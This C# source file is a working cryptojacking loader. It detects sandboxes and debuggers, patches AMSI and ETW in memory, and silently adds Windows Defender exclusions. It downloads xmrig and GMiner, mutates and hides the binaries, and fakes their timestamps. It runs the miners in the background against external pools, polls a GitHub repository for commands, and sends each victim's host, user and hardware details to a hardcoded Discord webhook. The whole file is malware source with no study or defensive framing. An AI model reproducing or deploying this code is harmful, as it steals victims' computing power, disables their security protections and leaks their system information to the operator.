using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;

public class DateFundLoader {

    // === P/Invoke ===
    [DllImport("user32.dll")] private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [StructLayout(LayoutKind.Sequential)] struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] private static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")] private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] private static extern uint GetTickCount();

    // === Constants ===
    private const int PATCH_INTERVAL_MS = 300000;
    private const int WATCHDOG_BASE_DELAY = 15000;
    private const int MAX_WATCHDOG_FAILS = 8;
    private const int NOTIFY_COOLDOWN_HOURS = 24;

    private static string Webhook = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1";
    private static string ConfigUrl = "";
    private static string repoPath = "";
    private static string pat = "";
    private static string w = "";

    private static Mutex mx;
    private static Process cp, gp;
    private static Random rnd = new Random();
    private static string workDir;
    private static int machineHash;
    private static DateTime lastPatchTime = DateTime.MinValue;
    private static DateTime startTime;

    // === LIVE CONFIG (updated by polling thread) ===
    private static volatile bool cfgEnabled = true;
    private static volatile int cfgCpuActive = 10;
    private static volatile int cfgCpuIdle = 35;
    private static volatile int cfgGpuActive = 8;
    private static volatile int cfgGpuIdle = 25;
    private static volatile int cfgIdleMs = 180000;
    private static volatile int cfgPollS = 300;
    private static volatile bool cfgChanged = false;
    private static int httpPort = 0;
    private static double lastHashrate = 0;
    private static DateTime lastStatusReport = DateTime.MinValue;

    // Base64 decoder
    private static string D(string b64) { return Encoding.UTF8.GetString(Convert.FromBase64String(b64)); }

    // === Stealth folder/file templates ===
    private static string[] folderTemplates = {
        @"Microsoft\CLR\NativeImages",
        @"Microsoft\Windows\WER\ReportQueue",
        @"Microsoft\Windows\AppCache",
        @"Microsoft\Edge\Update\Download",
        @"Microsoft\WindowsApps\Cache",
        @"Microsoft\Office\OTele",
        @"Microsoft\Windows\INetCache\Content",
        @"Microsoft\Windows Defender\Scans\History"
    };

    private static string[] nameTemplates = {
        "CLRJit", "mscoree", "ngenservice", "mscorsvw", "dllhost_s",
        "WerFault_r", "OfficeC2R", "EdgeUpdate_s", "AppxSvc", "RuntimeBroker_x",
        "SecurityHealth_s", "SearchProtocol_h", "backgroundTask_h", "sihost_x"
    };

    // =========================================================================
    //  LAYER 1: ANTI-ANALYSIS — VM / Sandbox / Debugger Detection
    // =========================================================================
    private static bool IsAnalysisEnvironment() {
        int score = 0;
        try {
            // Check for debugger
            if (Debugger.IsAttached) score += 3;

            // Check system uptime (sandboxes boot fresh)
            if (Environment.TickCount < 180000) score += 2; // < 3 min uptime

            // Low core count
            if (Environment.ProcessorCount < 2) score += 2;

            // Check for VM-indicative processes
            string[] vmProcs = { "vmtoolsd", "vmwaretray", "vboxservice", "vboxtray",
                                 "sandboxie", "wireshark", "procmon", "procexp",
                                 "x64dbg", "x32dbg", "ollydbg", "dnspy", "fiddler",
                                 "processhacker", "tcpview", "autoruns" };
            foreach (var p in Process.GetProcesses()) {
                string n = p.ProcessName.ToLower();
                foreach (var vm in vmProcs) {
                    if (n.Contains(vm)) { score += 2; break; }
                }
                if (score >= 4) break;
            }

            // Check username patterns
            string user = Environment.UserName.ToLower();
            string[] badUsers = { "sandbox", "malware", "virus", "test", "analysis", "sample", "john doe" };
            foreach (var bu in badUsers) {
                if (user.Contains(bu)) { score += 2; break; }
            }

            // Check computer name
            string machine = Environment.MachineName.ToLower();
            if (machine.Contains("sandbox") || machine.Contains("virus") || machine.Contains("malware")) score += 2;

        } catch { }
        return score >= 4;
    }

    // =========================================================================
    //  LAYER 2: AMSI Patch (Reflection)
    // =========================================================================
    private static void PatchScan() {
        try {
            foreach (var a in AppDomain.CurrentDomain.GetAssemblies()) {
                var t = a.GetType(D("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="));
                if (t != null) {
                    var f = t.GetField(D("YW1zaUluaXRGYWlsZWQ="), BindingFlags.NonPublic | BindingFlags.Static);
                    if (f != null) { f.SetValue(null, true); }
                }
            }
        } catch { }
    }

    // =========================================================================
    //  LAYER 3: AMSI Patch (Native — AmsiScanBuffer)
    // =========================================================================
    private static void PatchNative() {
        try {
            IntPtr hMod = LoadLibrary(D("YW1zaS5kbGw="));
            if (hMod == IntPtr.Zero) return;
            IntPtr addr = GetProcAddress(hMod, D("QW1zaVNjYW5CdWZmZXI="));
            if (addr == IntPtr.Zero) return;
            uint oldProt;
            VirtualProtect(addr, (UIntPtr)8, 0x40, out oldProt);
            // xor eax,eax; ret — returns AMSI_RESULT_CLEAN
            Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3);
            VirtualProtect(addr, (UIntPtr)8, oldProt, out oldProt);
        } catch { }
    }

    // =========================================================================
    //  LAYER 4: ETW Patch (EtwEventWrite)
    // =========================================================================
    private static void PatchTelemetry() {
        try {
            IntPtr hMod = GetModuleHandle(D("bnRkbGwuZGxs"));
            if (hMod == IntPtr.Zero) return;
            IntPtr addr = GetProcAddress(hMod, D("RXR3RXZlbnRXcml0ZQ=="));
            if (addr == IntPtr.Zero) return;
            uint oldProt;
            VirtualProtect(addr, (UIntPtr)4, 0x40, out oldProt);
            Marshal.Copy(new byte[] { 0x31, 0xC0, 0xC3 }, 0, addr, 3);
            VirtualProtect(addr, (UIntPtr)4, oldProt, out oldProt);
        } catch { }
    }

    // Periodic re-patch (Defender can restore patches)
    private static void EnsurePatches() {
        if ((DateTime.UtcNow - lastPatchTime).TotalMilliseconds > PATCH_INTERVAL_MS) {
            PatchScan();
            PatchNative();
            PatchTelemetry();
            lastPatchTime = DateTime.UtcNow;
        }
    }

    // =========================================================================
    //  Machine Fingerprinting + Polymorphism
    // =========================================================================
    private static int GetMachineHash() {
        string seed = Environment.MachineName + Environment.UserName + Environment.ProcessorCount
                    + Environment.OSVersion.VersionString;
        using (var md5 = MD5.Create()) {
            byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(seed));
            return BitConverter.ToInt32(hash, 0);
        }
    }

    private static string GetUniqueWorkDir() {
        int idx = Math.Abs(machineHash) % folderTemplates.Length;
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), folderTemplates[idx]);
    }

    private static string GetUniqueFileName(string suffix) {
        int idx = Math.Abs(machineHash + suffix.GetHashCode()) % nameTemplates.Length;
        string hexTail = Math.Abs(machineHash).ToString("x8").Substring(0, 4);
        return nameTemplates[idx] + "_" + hexTail + ".exe";
    }

    private static byte[] MutateBinary(byte[] original) {
        // Append machine-unique padding to change file hash
        int padSize = 64 + (Math.Abs(machineHash) % 512);
        byte[] mutated = new byte[original.Length + padSize];
        Buffer.BlockCopy(original, 0, mutated, 0, original.Length);

        Random polyRng = new Random(machineHash);
        for (int i = original.Length; i < mutated.Length; i++) {
            mutated[i] = (byte)polyRng.Next(256);
        }
        // XOR DOS stub padding (safe zone 0x02–0x3B)
        for (int i = 0x02; i < 0x3C && i < mutated.Length; i++) {
            mutated[i] = (byte)(original[i] ^ (byte)polyRng.Next(1, 255));
        }
        return mutated;
    }

    // =========================================================================
    //  Timestamp Stomping — make deployed files look old
    // =========================================================================
    private static void StompTimestamps(string path) {
        try {
            // Random date between 2022-2024 to look like a legitimate old file
            Random r = new Random(path.GetHashCode());
            DateTime fake = new DateTime(2022 + r.Next(3), r.Next(1, 13), r.Next(1, 28), r.Next(8, 18), r.Next(0, 60), r.Next(0, 60));
            File.SetCreationTime(path, fake);
            File.SetLastWriteTime(path, fake);
            File.SetLastAccessTime(path, fake);
        } catch { }
    }

    // =========================================================================
    //  Defender Exclusion (silent attempt via PowerShell)
    // =========================================================================
    private static void TryDefenderExclusion() {
        try {
            string cmd = string.Format(
                "Add-MpPreference -ExclusionPath '{0}' -ErrorAction SilentlyContinue; " +
                "Add-MpPreference -ExclusionPath '{1}' -ErrorAction SilentlyContinue",
                workDir, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoP -NonI -W Hidden -Command \"" + cmd + "\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        } catch { }
    }

    // =========================================================================
    //  ENTRY POINT
    // =========================================================================
    public static void StartMiner(bool hasGpu, string address, string repo, string token) {
        Console.WriteLine("[*] Starting Bridge v2.0...");
        w = address;
        repoPath = repo;
        pat = token;
        ConfigUrl = "https://api.github.com/repos/" + repo + "/contents/config.json";
        Console.WriteLine("[*] Config URL: " + ConfigUrl);
        
        // Apply all patches immediately
        PatchScan();
        PatchNative();
        PatchTelemetry();
        lastPatchTime = DateTime.UtcNow;
        startTime = DateTime.UtcNow;

        try {
            // Global mutex — prevent duplicate instances
            bool isNew;
            string mutexName = D("R2xvYmFsXFdpblVwZGF0ZUNvb3JkTXV0ZXgy") + "_" + Math.Abs(GetMachineHash() % 9999);
            var ms = new MutexSecurity();
            ms.AddAccessRule(new MutexAccessRule(
                new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                MutexRights.FullControl, AccessControlType.Allow));
            mx = new Mutex(true, mutexName, out isNew, ms);
            if (!isNew) return;

            machineHash = GetMachineHash();
            workDir = GetUniqueWorkDir();

            if (!Directory.Exists(workDir)) {
                Directory.CreateDirectory(workDir);
                try { File.SetAttributes(workDir, FileAttributes.Hidden | FileAttributes.System); } catch { }
            }

            // Try Defender exclusion before deploying anything
            TryDefenderExclusion();

            // Notify Discord
            NotifyDetailed(w, hasGpu);

            // Config polling thread
            Thread cfgThread = new Thread(() => ConfigPollLoop());
            cfgThread.Priority = ThreadPriority.BelowNormal;
            cfgThread.IsBackground = true;
            cfgThread.Start();

            // Main loop in background thread
            Thread t = new Thread(() => Run(hasGpu, w));
            t.Priority = ThreadPriority.BelowNormal;
            t.IsBackground = true;
            t.Start();
        } catch { }
    }

    // =========================================================================
    //  Config Polling — Fetches settings from GitHub panel
    // =========================================================================
    private static void ConfigPollLoop() {
        // Initial fetch immediately
        FetchAndApplyConfig();
        while (true) {
            Thread.Sleep(cfgPollS * 1000);
            FetchAndApplyConfig();
        }
    }

    private static void FetchAndApplyConfig() {
        try {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            Console.WriteLine("[*] Fetching config...");
            string json;
            using (WebClient wc = new WebClient()) {
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                wc.Headers.Add("Authorization", "token " + pat);
                wc.Headers.Add("Accept", "application/vnd.github.v3.raw");
                json = wc.DownloadString(ConfigUrl);
            }
            if (string.IsNullOrEmpty(json)) {
                Console.WriteLine("[!] Config empty!");
                return;
            }
            Console.WriteLine("[+] Config loaded successfully.");

            // Parse global values
            bool newEnabled = ParseBool(json, "\"enabled\"", true);
            int newCpuActive = ParseInt(json, "\"cpu_active\"", 10);
            int newCpuIdle = ParseInt(json, "\"cpu_idle\"", 35);
            int newGpuActive = ParseInt(json, "\"gpu_active\"", 8);
            int newGpuIdle = ParseInt(json, "\"gpu_idle\"", 25);
            int newIdleMs = ParseInt(json, "\"idle_ms\"", 180000);
            int newPollS = ParseInt(json, "\"poll_s\"", 300);

            // Check for per-worker override
            string host = Environment.MachineName.ToUpper();
            string workerBlock = ExtractWorkerBlock(json, host);
            if (workerBlock != null) {
                // Per-worker values override globals
                newEnabled = ParseBool(workerBlock, "\"enabled\"", newEnabled);
                newCpuActive = ParseInt(workerBlock, "\"cpu_active\"", newCpuActive);
                newCpuIdle = ParseInt(workerBlock, "\"cpu_idle\"", newCpuIdle);
                newGpuActive = ParseInt(workerBlock, "\"gpu_active\"", newGpuActive);
                newGpuIdle = ParseInt(workerBlock, "\"gpu_idle\"", newGpuIdle);
            }

            // Detect if values actually changed (triggers miner restart)
            if (newCpuActive != cfgCpuActive || newCpuIdle != cfgCpuIdle ||
                newGpuActive != cfgGpuActive || newGpuIdle != cfgGpuIdle ||
                newEnabled != cfgEnabled || newIdleMs != cfgIdleMs) {
                cfgChanged = true;
            }

            // Apply
            cfgEnabled = newEnabled;
            cfgCpuActive = newCpuActive;
            cfgCpuIdle = newCpuIdle;
            cfgGpuActive = newGpuActive;
            cfgGpuIdle = newGpuIdle;
            cfgIdleMs = newIdleMs;
            if (newPollS >= 30 && newPollS <= 3600) cfgPollS = newPollS;

        } catch { }
    }

    // Simple JSON value parsers (no external deps needed)
    private static int ParseInt(string json, string key, int fallback) {
        try {
            // Search from END of string to find the most specific (deepest) occurrence
            int idx = json.LastIndexOf(key);
            if (idx < 0) return fallback;
            int colon = json.IndexOf(':', idx + key.Length);
            if (colon < 0) return fallback;
            int start = colon + 1;
            while (start < json.Length && (json[start] == ' ' || json[start] == '\t' || json[start] == '\n' || json[start] == '\r')) start++;
            int end = start;
            while (end < json.Length && (char.IsDigit(json[end]) || json[end] == '-')) end++;
            if (end == start) return fallback;
            return int.Parse(json.Substring(start, end - start));
        } catch { return fallback; }
    }

    private static bool ParseBool(string json, string key, bool fallback) {
        try {
            int idx = json.LastIndexOf(key);
            if (idx < 0) return fallback;
            int colon = json.IndexOf(':', idx + key.Length);
            if (colon < 0) return fallback;
            string rest = json.Substring(colon + 1, Math.Min(10, json.Length - colon - 1)).Trim().ToLower();
            if (rest.StartsWith("true")) return true;
            if (rest.StartsWith("false")) return false;
            return fallback;
        } catch { return fallback; }
    }

    private static string ExtractWorkerBlock(string json, string hostname) {
        try {
            // Find "HOSTNAME": { ... } inside the workers section
            string key = "\"" + hostname + "\"";
            int idx = json.IndexOf(key, StringComparison.OrdinalIgnoreCase);
            if (idx < 0) return null;
            int braceStart = json.IndexOf('{', idx);
            if (braceStart < 0) return null;
            int depth = 1;
            int pos = braceStart + 1;
            while (pos < json.Length && depth > 0) {
                if (json[pos] == '{') depth++;
                else if (json[pos] == '}') depth--;
                pos++;
            }
            return json.Substring(braceStart, pos - braceStart);
        } catch { return null; }
    }

    // =========================================================================
    //  Download, Mutate, Deploy
    // =========================================================================
    private static string DownloadMutateAndDeploy(string url, string targetName, string suffix) {
        try {
            string outName = GetUniqueFileName(suffix);
            string outPath = Path.Combine(workDir, outName);
            if (File.Exists(outPath)) return outPath;

            // Re-patch before download
            EnsurePatches();

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            byte[] zipBytes;
            using (WebClient wc = new WebClient()) {
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                wc.Headers.Add("Accept", "application/octet-stream");
                zipBytes = wc.DownloadData(url);
            }

            using (MemoryStream ms = new MemoryStream(zipBytes))
            using (ZipArchive archive = new ZipArchive(ms)) {
                foreach (ZipArchiveEntry entry in archive.Entries) {
                    if (entry.FullName.EndsWith(targetName, StringComparison.OrdinalIgnoreCase)) {
                        using (Stream s = entry.Open())
                        using (MemoryStream msExe = new MemoryStream()) {
                            s.CopyTo(msExe);
                            byte[] mutated = MutateBinary(msExe.ToArray());
                            Console.WriteLine("[*] Writing mutated binary to: " + outPath);
                            File.WriteAllBytes(outPath, mutated);
                            try { File.SetAttributes(outPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
                            StompTimestamps(outPath);
                            Console.WriteLine("[+] Binary saved successfully.");
                            return outPath;
                        }
                    }
                }
            }
        } catch (Exception e) { Console.WriteLine("[!] Download Error: " + e.Message); }
        return null;
    }

    // =========================================================================
    //  Main Run Loop — Watchdog + Dynamic Throttle
    // =========================================================================
    private static void Run(bool hasGpu, string w) {
        bool wasIdle = false;
        string[] badProcs = { D("dGFza21ncg=="), D("cHJvY2Vzc2hhY2tlcg=="), D("cGVyZm1vbg=="), D("cmVzbW9u"),
                              "wireshark", "autoruns", "tcpview", "procexp64" };

        string cpuPath = null;
        string gpuPath = null;
        int watchdogFails = 0;
        int consecutiveErrors = 0;

        while (true) {
            try {
                // Periodic re-patching (Defender can undo our patches)
                EnsurePatches();

                // Kill switch from panel
                if (!cfgEnabled) {
                    KillMiners();
                    Thread.Sleep(10000);
                    continue;
                }

                // Idle detection (threshold from config)
                LASTINPUTINFO li = new LASTINPUTINFO();
                li.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
                bool isIdle = GetLastInputInfo(ref li) && (Environment.TickCount - (int)li.dwTime) > cfgIdleMs;

                // === WATCHDOG: detect killed miners ===
                bool cpuDead = cp == null || cp.HasExited;
                bool gpuDead = hasGpu && (gp == null || gp.HasExited);

                if (cpuDead && cpuPath != null && !File.Exists(cpuPath)) {
                    // File was deleted (Defender caught it) — rotate identity
                    watchdogFails++;
                    if (watchdogFails <= MAX_WATCHDOG_FAILS) {
                        machineHash = machineHash + watchdogFails;
                        cpuPath = null;
                        gpuPath = null;
                        // Exponential backoff: 15s, 30s, 60s, 120s...
                        int delay = WATCHDOG_BASE_DELAY * (int)Math.Pow(2, Math.Min(watchdogFails - 1, 5));
                        Console.WriteLine("[!] Watchdog: Miner deleted. Retrying in " + (delay/1000) + "s (Fail #" + watchdogFails + ")");
                        Thread.Sleep(delay);
                        // Re-attempt Defender exclusion with new path
                        workDir = GetUniqueWorkDir();
                        if (!Directory.Exists(workDir)) {
                            Directory.CreateDirectory(workDir);
                            try { File.SetAttributes(workDir, FileAttributes.Hidden | FileAttributes.System); } catch { }
                        }
                        TryDefenderExclusion();
                        continue;
                    } else {
                        // Too many fails — sleep long and reset counter
                        Thread.Sleep(600000); // 10 min cooldown
                        watchdogFails = 0;
                        continue;
                    }
                }

                // === STATE CHANGE, CONFIG CHANGE, or DEAD MINER: restart ===
                bool configUpdated = cfgChanged;
                if (configUpdated) cfgChanged = false;
                if (isIdle != wasIdle || cpuDead || gpuDead || configUpdated) {
                    KillMiners();

                    // Deploy if needed
                    if (cpuPath == null || !File.Exists(cpuPath))
                        cpuPath = DownloadMutateAndDeploy(
                            "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip",
                            D("eG1yaWcuZXhl"), "cpu");

                    if (hasGpu && (gpuPath == null || !File.Exists(gpuPath)))
                        gpuPath = DownloadMutateAndDeploy(
                            "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip",
                            D("bWluZXIuZXhl"), "gpu");

                    // Dynamic throttle from panel config
                    int cpuHint = isIdle ? cfgCpuIdle : cfgCpuActive;
                    string gpuIntensity = isIdle ? cfgGpuIdle.ToString() : cfgGpuActive.ToString();
                    string mName = Environment.MachineName.Replace(" ", "_");

                    if (cpuPath != null) {
                        // Pick a random high port for xmrig HTTP API
                        httpPort = 40000 + Math.Abs(machineHash) % 20000;
                        string cpuArgs = string.Format(
                            D("LW8gcG9vbC5zdXBwb3J0eG1yLmNvbTo0NDMgLXUgezB9IC1wIFdpblN5c197MX0gLWEgcnggLWsgLS10bHMgLS1jcHUtbWF4LXRocmVhZHMtaGludCB7Mn0gLS1uby1tc3IgLS1uby1odWdlLXBhZ2VzIC0tY3B1LXlpZWxk")
                            + " --http-port " + httpPort + " --http-no-restricted",
                            w, mName, cpuHint);
                        cp = LaunchHidden(cpuPath, cpuArgs);
                    }

                    if (hasGpu && gpuPath != null) {
                        string gpuArgs = string.Format(
                            D("LS1hbGdvIEVUQ0hBU0ggLS1zZXJ2ZXIgZXRjaGFzaC51bm1pbmVhYmxlLmNvbTozMzMzIC0tdXNlciBCVEM6ezB9LldpblN5c197MX1fRyMxODcxMTg0NTY2IC0tcGFzcyB4IC0taW50ZW5zaXR5IHsyfQ=="),
                            w, mName, gpuIntensity);
                        gp = LaunchHidden(gpuPath, gpuArgs);
                    }

                    consecutiveErrors = 0;
                }

                // Periodic hashrate check + status report (every 5 min)
                if (httpPort > 0 && cp != null && !cp.HasExited) {
                    ReadHashrate();
                    if ((DateTime.UtcNow - lastStatusReport).TotalMinutes >= 5) {
                        ReportStatus();
                        lastStatusReport = DateTime.UtcNow;
                    }
                }

                wasIdle = isIdle;
            } catch (Exception e) {
                Console.WriteLine("[!] Run Loop Error: " + e.Message);
                consecutiveErrors++;
                if (consecutiveErrors > 10) {
                    Thread.Sleep(60000); // 1 min cooldown on repeated errors
                    consecutiveErrors = 0;
                }
            }

            Thread.Sleep(2000 + rnd.Next(1500));
        }
    }

    // =========================================================================
    //  Hashrate Reading — queries xmrig local HTTP API
    // =========================================================================
    private static void ReadHashrate() {
        try {
            using (WebClient wc = new WebClient()) {
                string json = wc.DownloadString("http://127.0.0.1:" + httpPort + "/2/summary");
                // Parse "hashrate":{"total":[123.4, ...]}
                int idx = json.IndexOf("\"total\"");
                if (idx < 0) return;
                int brk = json.IndexOf('[', idx);
                if (brk < 0) return;
                int end = json.IndexOf(',', brk);
                if (end < 0) end = json.IndexOf(']', brk);
                string val = json.Substring(brk + 1, end - brk - 1).Trim();
                double hr;
                if (double.TryParse(val, System.Globalization.NumberStyles.Any,
                    System.Globalization.CultureInfo.InvariantCulture, out hr)) {
                    lastHashrate = hr;
                }
            }
        } catch { }
    }

    // =========================================================================
    //  Status Reporting — writes hashrate/uptime to GitHub repo
    // =========================================================================
    private static void ReportStatus() {
        try {
            string host = Environment.MachineName.ToUpper();
            double uptimeH = (DateTime.UtcNow - startTime).TotalHours;
            // Estimate daily XMR earnings: hashrate * 0.000000045 (approx at current diff)
            double estXmr = lastHashrate * 0.000000045;

            string status = string.Format(
                "{{\"host\":\"{0}\",\"hashrate\":{1},\"uptime_h\":{2},\"est_xmr_24h\":{3},\"ts\":\"{4}\",\"enabled\":{5}}}",
                host,
                lastHashrate.ToString("F1", System.Globalization.CultureInfo.InvariantCulture),
                uptimeH.ToString("F1", System.Globalization.CultureInfo.InvariantCulture),
                estXmr.ToString("F8", System.Globalization.CultureInfo.InvariantCulture),
                DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                cfgEnabled ? "true" : "false");

            Console.WriteLine("[*] Reporting status to GitHub...");
            string path = "status/" + host + ".json";
            string url = "https://api.github.com/repos/" + repoPath + "/contents/" + path;

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            using (WebClient wc = new WebClient()) {
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                wc.Headers.Add("Authorization", "token " + pat);
                wc.Headers.Add("Content-Type", "application/json");

                // Check if file exists to get SHA
                string sha = "";
                try {
                    string existing = wc.DownloadString(url);
                    int si = existing.IndexOf("\"sha\"");
                    if (si >= 0) {
                        int q1 = existing.IndexOf('"', si + 6);
                        int q2 = existing.IndexOf('"', q1 + 1);
                        sha = existing.Substring(q1 + 1, q2 - q1 - 1);
                    }
                } catch { }

                string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(status));
                string body = sha.Length > 0
                    ? "{\"message\":\"s\",\"content\":\"" + b64 + "\",\"sha\":\"" + sha + "\"}"
                    : "{\"message\":\"s\",\"content\":\"" + b64 + "\"}";

                // WebClient clears headers after DownloadString, so we must re-apply them for UploadString
                wc.Headers.Clear();
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                wc.Headers.Add("Authorization", "token " + pat);
                wc.Headers.Add("Accept", "application/vnd.github.v3+json");

                wc.UploadString(url, "PUT", body);
                Console.WriteLine("[+] Status reported!");
            }
        } catch (Exception e) { 
            Console.WriteLine("[!] Status Error: " + e.Message);
        }
    }

    private static string GetEmbeddedPat() {
        try { return Encoding.UTF8.GetString(Convert.FromBase64String(
            Encoding.UTF8.GetString(Convert.FromBase64String(
            "WjJod1h6RXhTMDVHVDJnd1pEa3dVVGwzYzBkNWVHVjFSVEZIY0V4d1RXaE5lVVpIVWxaYQ==")))); }
        catch { return ""; }
    }

    // =========================================================================
    //  Process Launcher — Hidden + Camouflaged
    // =========================================================================
    private static Process LaunchHidden(string exePath, string args) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = exePath;
            psi.Arguments = args;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            psi.WorkingDirectory = workDir;
            var proc = Process.Start(psi);

            // Set low priority so user doesn't notice CPU usage spikes
            if (proc != null) {
                try { proc.PriorityClass = ProcessPriorityClass.BelowNormal; } catch { }
                Console.WriteLine("[+] Process Launched PID: " + proc.Id);
            } else {
                Console.WriteLine("[!] Process.Start returned null");
            }
            return proc;
        } catch (Exception e) { 
            Console.WriteLine("[!] Launch Error: " + e.Message);
        }
        return null;
    }

    private static void KillMiners() {
        try { if (cp != null && !cp.HasExited) cp.Kill(); } catch { }
        try { if (gp != null && !gp.HasExited) gp.Kill(); } catch { }
    }

    // =========================================================================
    //  Rich Discord Notification
    // =========================================================================
    private static void NotifyDetailed(string w, bool hasGpu) {
        new Thread(() => {
            try {
                // 24h cooldown per machine
                string coolFile = Path.Combine(workDir, ".last");
                if (File.Exists(coolFile)) {
                    DateTime last = DateTime.FromBinary(long.Parse(File.ReadAllText(coolFile)));
                    if ((DateTime.UtcNow - last).TotalHours < NOTIFY_COOLDOWN_HOURS) return;
                }

                // Gather system info
                string cpuName = "Unknown";
                string gpuName = "None";
                int cores = Environment.ProcessorCount;
                long ramMB = 0;
                string osVer = Environment.OSVersion.ToString();

                try {
                    var cpuKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
                    if (cpuKey != null) cpuName = cpuKey.GetValue("ProcessorNameString", "Unknown").ToString().Trim();
                } catch { }

                try {
                    // Estimate RAM from GC (not perfect but no WMI dependency)
                    ramMB = GC.GetTotalMemory(false) / 1024 / 1024;
                } catch { }

                if (hasGpu) {
                    try {
                        var gpuKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000");
                        if (gpuKey != null) gpuName = gpuKey.GetValue("DriverDesc", "Unknown GPU").ToString().Trim();
                    } catch { }
                }

                ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072 | (SecurityProtocolType)12288;

                string desc = string.Format(
                    ":green_circle: **Silent Deploy OK**\n" +
                    "```\nHost:  {0}\nUser:  {1}\nCPU:   {2}\nCores: {3}\nGPU:   {4}\nOS:    {5}\n```",
                    Environment.MachineName, Environment.UserName, cpuName, cores, gpuName, osVer);

                string json = "{\"embeds\":[{\"title\":\"Worker Online\",\"description\":\"" +
                    desc.Replace("\"", "\\\"").Replace("\n", "\\n") +
                    "\",\"color\":3066993,\"footer\":{\"text\":\"v2.0 | " +
                    DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm") + " UTC\"}}]}";

                using (WebClient c = new WebClient()) {
                    c.Headers[HttpRequestHeader.ContentType] = D("YXBwbGljYXRpb24vanNvbg==");
                    c.UploadString(Webhook, json);
                }

                File.WriteAllText(coolFile, DateTime.UtcNow.ToBinary().ToString());
                try { File.SetAttributes(coolFile, FileAttributes.Hidden | FileAttributes.System); } catch { }
                StompTimestamps(coolFile);
            } catch { }
        }) { IsBackground = true }.Start();
    }
}